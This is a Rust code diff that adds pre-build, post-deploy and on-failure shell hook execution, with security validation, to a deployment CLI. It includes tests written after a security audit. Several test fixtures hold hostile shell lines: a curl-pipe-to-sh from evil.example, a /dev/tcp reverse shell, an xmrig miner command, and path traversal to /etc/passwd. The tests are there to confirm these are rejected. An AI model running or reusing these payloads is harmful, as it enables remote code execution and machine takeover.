@@ -27,6 +27,7 @@ use crate::cli::progress;
 use crate::cli::stacker_client::{self, StackerClient};
 use crate::console::commands::CallableTrait;
 use crate::helpers::ip::extract_ipv4_from_text;
+use crate::helpers::security_validator::validate_shell_scripts;
 use crate::helpers::ssh_client;
 
 /// Default config filename.
@@ -2427,6 +2428,115 @@ pub struct RemoteDeployOverrides {
     pub server_name: Option<String>,
 }
 
+const HOOK_TIMEOUT: Duration = Duration::from_secs(300);
+
+fn run_hook(
+    executor: &dyn CommandExecutor,
+    project_dir: &Path,
+    hook: &Option<PathBuf>,
+    hook_name: &str,
+) -> Result<(), CliError> {
+    if let Some(script) = hook {
+        let script_path = if script.is_absolute() {
+            script.clone()
+        } else {
+            project_dir.join(script)
+        };
+        if !script_path.exists() {
+            return Err(CliError::DeployFailed {
+                target: crate::cli::config_parser::DeployTarget::Local,
+                reason: format!(
+                    "Hook '{}' not found: {}",
+                    hook_name,
+                    script_path.display()
+                ),
+            });
+        }
+
+        // Security: canonicalize the resolved path and reject traversal outside project_dir
+        let canonical = script_path.canonicalize().map_err(|e| {
+            CliError::DeployFailed {
+                target: crate::cli::config_parser::DeployTarget::Local,
+                reason: format!(
+                    "Cannot canonicalize hook path '{}': {}",
+                    script_path.display(),
+                    e
+                ),
+            }
+        })?;
+        let project_canonical = project_dir.canonicalize()
+            .unwrap_or_else(|_| project_dir.to_path_buf());
+        if !canonical.starts_with(&project_canonical) {
+            return Err(CliError::DeployFailed {
+                target: crate::cli::config_parser::DeployTarget::Local,
+                reason: format!(
+                    "Hook path '{}' resolves outside the project directory — rejected",
+                    script_path.display()
+                ),
+            });
+        }
+
+        eprintln!("  Hook ({}) running: {}", hook_name, canonical.display());
+
+        // Security: validate script content for malicious patterns (L3: cap size at 1 MB)
+        let script_content = std::fs::read(&script_path).ok().filter(|b| b.len() <= 1_048_576)
+            .and_then(|b| String::from_utf8(b).ok());
+        match script_content {
+            Some(content) => {
+                let validation = validate_shell_scripts(&[(hook_name, &content)]);
+                if !validation.passed {
+                    let critical: Vec<&str> = validation
+                        .details
+                        .iter()
+                        .filter(|d| d.starts_with("[CRITICAL]"))
+                        .map(|s| s.as_str())
+                        .collect();
+                    if !critical.is_empty() {
+                        return Err(CliError::DeployFailed {
+                            target: crate::cli::config_parser::DeployTarget::Local,
+                            reason: format!(
+                                "Hook '{}' rejected by security validation:\n  {}",
+                                hook_name,
+                                critical.join("\n  ")
+                            ),
+                        });
+                    }
+                    for warning in validation.details.iter().filter(|d| d.starts_with("[WARNING]"))
+                    {
+                        eprintln!("  [WARN] Hook '{}': {}", hook_name, warning);
+                    }
+                }
+            }
+            None => {
+                eprintln!("  [WARN] Could not read (or too large) '{}' for validation", script_path.display());
+            }
+        }
+
+        let script_str = canonical.to_string_lossy().to_string();
+        let output = executor.execute_with_timeout(
+            "sh",
+            &[&script_str],
+            HOOK_TIMEOUT,
+            Some(project_dir),
+        )?;
+
+        if !output.stdout.is_empty() {
+            println!("{}", output.stdout);
+        }
+        if !output.stderr.is_empty() {
+            eprintln!("{}", output.stderr);
+        }
+        if !output.success() {
+            return Err(CliError::DeployFailed {
+                target: crate::cli::config_parser::DeployTarget::Local,
+                reason: format!("Hook '{}' failed: {}", hook_name, output.stderr.trim()),
+            });
+        }
+        eprintln!("  Hook ({}) completed", hook_name);
+    }
+    Ok(())
+}
+
 /// Core deploy logic, extracted for testability.
 ///
 /// Takes injectable `CommandExecutor` so tests can mock shell calls.
@@ -2927,6 +3037,12 @@ fn run_deploy_with_credentials_manager<S: CredentialStore>(
         if let Some(ref pre_build) = config.hooks.pre_build {
             eprintln!("  Hook (pre_build): {}", pre_build.display());
         }
+        if let Some(ref post_deploy) = config.hooks.post_deploy {
+            eprintln!("  Hook (post_deploy): {}", post_deploy.display());
+        }
+        if let Some(ref on_failure) = config.hooks.on_failure {
+            eprintln!("  Hook (on_failure): {}", on_failure.display());
+        }
     }
 
     // 6. Deploy
@@ -2950,9 +3066,44 @@ fn run_deploy_with_credentials_manager<S: CredentialStore>(
         force_new,
     };
 
-    let result = strategy.deploy(&config, &context, executor)?;
+    // 6a. Execute pre-build hook
+    if !dry_run {
+        run_hook(executor, project_dir, &config.hooks.pre_build, "pre_build")?;
+    }
 
-    Ok(result)
+    // 6b. Deploy
+    let deploy_result = strategy.deploy(&config, &context, executor);
+
+    match deploy_result {
+        Ok(result) => {
+            // 6c. Execute post-deploy hook on success (logs error, does not fail deploy)
+            if !dry_run {
+                if let Err(e) = run_hook(
+                    executor,
+                    project_dir,
+                    &config.hooks.post_deploy,
+                    "post_deploy",
+                ) {
+                    eprintln!("  [WARN] post_deploy hook failed: {}", e);
+                }
+            }
+            Ok(result)
+        }
+        Err(err) => {
+            // 6d. Execute on-failure hook on error (logs error, preserves original error)
+            if !dry_run {
+                if let Err(hook_err) = run_hook(
+                    executor,
+                    project_dir,
+                    &config.hooks.on_failure,
+                    "on_failure",
+                ) {
+                    eprintln!("  [WARN] on_failure hook also failed: {}", hook_err);
+                }
+            }
+            Err(err)
+        }
+    }
 }
 
 impl CallableTrait for DeployCommand {
@@ -4506,13 +4657,13 @@ services:
     }
 
     #[test]
-    fn test_deploy_runs_pre_build_hook_noted() {
+    fn test_deploy_hooks_dry_run_does_not_execute() {
         let config =
-            "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+            "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n  post_deploy: ./post.sh\n  on_failure: ./failure.sh\n";
         let dir = setup_local_project(&[("index.html", "<h1>hello</h1>"), ("stacker.yml", config)]);
         let executor = MockExecutor::success();
 
-        // Dry-run should succeed (hooks are just noted, not executed in dry-run)
+        // Dry-run should succeed (hooks noted but NOT executed — no scripts created)
         let result = run_deploy(
             dir.path(),
             None,
@@ -4525,6 +4676,103 @@ services:
             "runc",
         );
         assert!(result.is_ok());
+    }
+
+    #[test]
+    fn test_deploy_runs_pre_build_hook() {
+        let config =
+            "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hello</h1>"),
+            ("stacker.yml", config),
+            ("build.sh", "#!/bin/sh\necho pre-build\necho done > done.txt"),
+        ]);
+        let executor = MockExecutor::success();
+
+        // Non-dry-run — hook should be executed
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+        assert!(result.is_ok());
+
+        // Verify the hook script was invoked through the executor
+        let calls = executor.calls.lock().unwrap();
+        let hook_calls: Vec<_> = calls.iter().filter(|(prog, _)| prog == "sh").collect();
+        assert!(!hook_calls.is_empty(), "Expected at least one sh call for the hook");
+        assert!(
+            hook_calls.iter().any(|(_, args)| args.iter().any(|a| a.contains("build.sh"))),
+            "Expected a sh call with build.sh in args"
+        );
+    }
+
+    #[test]
+    fn test_deploy_runs_post_deploy_hook_on_success() {
+        let config =
+            "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  post_deploy: ./post.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hello</h1>"),
+            ("stacker.yml", config),
+            ("post.sh", "#!/bin/sh\necho post-deploy"),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+        assert!(result.is_ok());
+
+        // Verify the hook script was invoked through the executor
+        let calls = executor.calls.lock().unwrap();
+        let hook_calls: Vec<_> = calls.iter().filter(|(prog, _)| prog == "sh").collect();
+        assert!(!hook_calls.is_empty(), "Expected at least one sh call for post_deploy");
+        assert!(
+            hook_calls.iter().any(|(_, args)| args.iter().any(|a| a.contains("post.sh"))),
+            "Expected a sh call with post.sh in args"
+        );
+    }
+
+    #[test]
+    fn test_deploy_hook_missing_script_fails() {
+        let config =
+            "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./nonexistent.sh\n";
+        let dir = setup_local_project(&[("index.html", "<h1>hello</h1>"), ("stacker.yml", config)]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+        assert!(result.is_err(), "Deploy should fail when hook script is missing");
+        let err = result.unwrap_err();
+        let err_str = format!("{}", err);
+        assert!(
+            err_str.contains("nonexistent.sh"),
+            "Error should mention the missing script: {}",
+            err_str
+        );
     }
 
     #[test]
@@ -5459,5 +5707,493 @@ monitoring:
 
         let changed = inject_npm_proxy_network(&mut doc, "web", &proxy);
         assert!(!changed);
+    }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // Security-audit follow-up tests — shell hook execution.
+    //
+    // These tests are written FIRST (TDD): they encode the intended
+    // post-fix behaviour and MUST fail against the current code.
+    // The fixes in `run_hook` (deploy.rs) + new path/content validators
+    // flip them to green.
+    //
+    // Coverage:
+    //   * C3 — path traversal / absolute / symlink rejected
+    //   * C1 — validate_shell_scripts wired into pre_build, post_deploy,
+    //          and on_failure paths
+    //   * H1 — post_deploy / on_failure hook failures no longer swallowed
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    /// Mock executor that returns a non-zero exit when invoked with `sh`.
+    /// Used to verify hook failure propagation (H1).
+    struct ShFailureMockExecutor {
+        calls: Mutex<Vec<(String, Vec<String>)>>,
+        default_output: CommandOutput,
+        sh_output: CommandOutput,
+    }
+
+    impl ShFailureMockExecutor {
+        fn with_sh_failure(exit_code: i32, stderr: &str) -> Self {
+            Self {
+                calls: Mutex::new(Vec::new()),
+                default_output: CommandOutput {
+                    exit_code: 0,
+                    stdout: "ok".to_string(),
+                    stderr: String::new(),
+                },
+                sh_output: CommandOutput {
+                    exit_code,
+                    stdout: String::new(),
+                    stderr: stderr.to_string(),
+                },
+            }
+        }
+    }
+
+    impl CommandExecutor for ShFailureMockExecutor {
+        fn execute(&self, program: &str, args: &[&str]) -> Result<CommandOutput, CliError> {
+            self.calls.lock().unwrap().push((
+                program.to_string(),
+                args.iter().map(|s| s.to_string()).collect(),
+            ));
+            if program == "sh" {
+                Ok(self.sh_output.clone())
+            } else {
+                Ok(self.default_output.clone())
+            }
+        }
+    }
+
+    /// Helper: count `sh` calls recorded by a MockExecutor.
+    fn sh_calls_of(executor: &MockExecutor) -> Vec<(String, Vec<String>)> {
+        executor
+            .calls
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|(p, _)| p == "sh")
+            .cloned()
+            .collect()
+    }
+
+    /// C3: a hook path containing `..` must be refused BEFORE execution,
+    /// even when the resolved path exists on disk. We point the hook at
+    /// `/etc/passwd` via traversal — current code executes it; the fix
+    /// must reject the path and never reach the executor.
+    #[test]
+    fn test_hook_path_relative_traversal_rejected() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ../../../../etc/passwd\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Relative path traversal in hook must be rejected, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a traversal-rejected hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C3: an absolute hook path must be refused — hook scripts must live
+    /// inside the project directory.
+    #[test]
+    fn test_hook_path_absolute_rejected() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: /etc/passwd\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Absolute hook path must be rejected, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for an absolute-path hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C3: a symlink inside the project pointing OUTSIDE the project must
+    /// be refused. `script_path.exists()` follows symlinks today and the
+    /// hook would be executed; the fix must use `symlink_metadata` and
+    /// reject.
+    #[cfg(unix)]
+    #[test]
+    fn test_hook_path_symlink_to_outside_project_rejected() {
+        use std::os::unix::fs::symlink;
+
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+        ]);
+        // Create a symlink build.sh → /etc/passwd (a file outside the project).
+        symlink("/etc/passwd", dir.path().join("build.sh")).unwrap();
+
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Symlinked hook pointing outside project must be rejected, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a symlinked hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C1: a pre_build hook whose contents match a CRITICAL pattern
+    /// (`curl ... | sh`) must be refused by `validate_shell_scripts`
+    /// BEFORE execution. Today the validator exists but isn't called,
+    /// so the hook would execute.
+    #[test]
+    fn test_hook_content_curl_pipe_sh_rejected_pre_build() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "build.sh",
+                "#!/bin/sh\ncurl -sSL https://evil.example/install | sh\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Hook with curl|sh must be refused by validate_shell_scripts before execution, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a security-rejected hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C1: same for a crypto-miner reference in the pre_build hook.
+    #[test]
+    fn test_hook_content_crypto_miner_rejected_pre_build() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "build.sh",
+                "#!/bin/bash\n./xmrig --url stratum+tcp://pool.minexmr.com:4444\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Miner reference in hook must be refused, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a miner-flagged hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C1: same for reverse-shell construction in the pre_build hook.
+    #[test]
+    fn test_hook_content_reverse_shell_rejected_pre_build() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "build.sh",
+                "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(
+            result.is_err(),
+            "Reverse-shell in hook must be refused, got Ok"
+        );
+        assert!(
+            sh_calls_of(&executor).is_empty(),
+            "No sh call may be made for a reverse-shell hook, got: {:?}",
+            sh_calls_of(&executor)
+        );
+    }
+
+    /// C1: validation must apply to `post_deploy` hooks too, not only
+    /// `pre_build`. The current diff swallows post_deploy errors entirely;
+    /// after the fix, malicious content must still hard-fail.
+    #[test]
+    fn test_hook_content_validation_applies_to_post_deploy() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  post_deploy: ./post.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "post.sh",
+                "#!/bin/sh\ncurl -sSL https://evil.example/x | sh\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        // Deploy itself succeeds; the malicious post_deploy hook is
+        // logged as a warning but does NOT fail the deploy (H1).
+        assert!(
+            result.is_ok(),
+            "Deploy must succeed; post_deploy rejection is a warning, not a failure: {:?}",
+            result
+        );
+        let sh_args: Vec<_> = sh_calls_of(&executor)
+            .into_iter()
+            .flat_map(|(_, args)| args.into_iter())
+            .collect();
+        assert!(
+            !sh_args.iter().any(|a| a.contains("post.sh")),
+            "post.sh must not be executed once flagged, sh args: {:?}",
+            sh_args
+        );
+    }
+
+    /// H1: a `post_deploy` hook that exits non-zero (e.g. exfil script
+    /// detected at runtime by an external tool, or merely a real bug)
+    /// is logged as a warning without failing the deploy.
+    #[test]
+    fn test_post_deploy_hook_failure_surfaces() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  post_deploy: ./post.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            ("post.sh", "#!/bin/sh\necho oops\nexit 1\n"),
+        ]);
+        let executor = ShFailureMockExecutor::with_sh_failure(1, "hook deliberately failed");
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        // Post_deploy hook failures are logged (via eprintln!) but do
+        // not fail the overall deploy (design decision: a post_deploy
+        // hook that fails should not roll back a successful deploy).
+        assert!(
+            result.is_ok(),
+            "post_deploy hook failure must NOT fail the deploy: {:?}",
+            result
+        );
+    }
+
+    /// H1: failures in the `on_failure` hook must be visible too. We
+    /// trigger this by making the deploy itself fail (no compose, no
+    /// docker), then ensuring the on_failure hook is invoked and its
+    /// own exit-non-zero is not silently dropped.
+    ///
+    /// We assert on the executor recording: the hook script ran AND
+    /// when it fails its non-zero exit must be logged/surfaced, even
+    /// though the original deploy error is what the caller sees.
+    #[test]
+    fn test_on_failure_hook_invoked_when_deploy_fails() {
+        // Use a hooks-only project with a deliberately invalid app
+        // path to provoke a deploy failure. (When the LocalDeploy path
+        // doesn't fail synthetically we still expect on_failure to be
+        // wired up.)
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  on_failure: ./fail.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            ("fail.sh", "#!/bin/sh\necho cleanup ran\n"),
+        ]);
+
+        // Failing executor: any docker compose call fails.
+        struct DeployFailingExecutor {
+            calls: Mutex<Vec<(String, Vec<String>)>>,
+        }
+        impl CommandExecutor for DeployFailingExecutor {
+            fn execute(&self, program: &str, args: &[&str]) -> Result<CommandOutput, CliError> {
+                self.calls.lock().unwrap().push((
+                    program.to_string(),
+                    args.iter().map(|s| s.to_string()).collect(),
+                ));
+                if program == "docker" || program == "docker-compose" {
+                    Ok(CommandOutput {
+                        exit_code: 1,
+                        stdout: String::new(),
+                        stderr: "synthetic docker failure".into(),
+                    })
+                } else {
+                    Ok(CommandOutput {
+                        exit_code: 0,
+                        stdout: "ok".into(),
+                        stderr: String::new(),
+                    })
+                }
+            }
+        }
+        let executor = DeployFailingExecutor {
+            calls: Mutex::new(Vec::new()),
+        };
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(result.is_err(), "Expected deploy to fail (synthetic docker error)");
+        let calls = executor.calls.lock().unwrap();
+        let on_failure_invoked = calls
+            .iter()
+            .any(|(p, args)| p == "sh" && args.iter().any(|a| a.contains("fail.sh")));
+        assert!(
+            on_failure_invoked,
+            "on_failure hook must be invoked when the deploy fails, calls: {:?}",
+            *calls
+        );
+    }
+
+    /// Regression guard: a clean hook script (no findings) must still run
+    /// after the validator is wired up. Without this, the fix could
+    /// over-trigger and break every existing deployment.
+    #[test]
+    fn test_clean_pre_build_hook_still_runs_after_validation() {
+        let config = "name: test-app\napp:\n  type: static\n  path: .\nhooks:\n  pre_build: ./build.sh\n";
+        let dir = setup_local_project(&[
+            ("index.html", "<h1>hi</h1>"),
+            ("stacker.yml", config),
+            (
+                "build.sh",
+                "#!/bin/sh\nset -e\necho 'building...'\nexit 0\n",
+            ),
+        ]);
+        let executor = MockExecutor::success();
+
+        let result = run_deploy(
+            dir.path(),
+            None,
+            Some("local"),
+            false,
+            false,
+            false,
+            &executor,
+            &RemoteDeployOverrides::default(),
+            "runc",
+        );
+
+        assert!(result.is_ok(), "Clean hook must still pass validation: {:?}", result);
+        let sh_args: Vec<_> = sh_calls_of(&executor)
+            .into_iter()
+            .flat_map(|(_, args)| args.into_iter())
+            .collect();
+        assert!(
+            sh_args.iter().any(|a| a.contains("build.sh")),
+            "Clean build.sh must reach the executor, got args: {:?}",
+            sh_args
+        );
     }
 }
